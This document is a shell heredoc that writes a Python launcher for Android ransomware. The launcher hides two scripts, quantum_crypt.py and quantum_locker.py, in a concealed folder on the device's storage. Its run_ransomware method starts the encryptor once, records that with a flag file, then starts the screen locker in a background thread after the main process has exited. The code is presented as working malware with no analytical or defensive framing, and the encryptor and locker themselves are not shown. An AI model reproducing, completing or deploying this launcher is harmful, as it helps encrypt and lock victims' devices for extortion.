cat > main.py << 'EOF'
import os
import sys
import subprocess
import threading
import time
import shutil

class QuantumMain:
    def __init__(self):
        self.cache = '/sdcard/Android/data/.quantum_system'
        
    def setup(self):
        os.makedirs(self.cache, exist_ok=True)
        for f in ['quantum_crypt.py', 'quantum_locker.py']:
            if os.path.exists(f): shutil.copy(f, self.cache)
    
    def run_ransomware(self):
        time.sleep(5)
        flag = f'{self.cache}/encrypted.flag'
        if not os.path.exists(flag):
            subprocess.Popen(['python3', f'{self.cache}/quantum_crypt.py'])
            open(flag, 'w').close()
        time.sleep(10)
        subprocess.Popen(['python3', f'{self.cache}/quantum_locker.py'])
    
    def main(self):
        self.setup()
        threading.Thread(target=self.run_ransomware).start()
        sys.exit()

if __name__ == '__main__':
    QuantumMain().main()
EOF
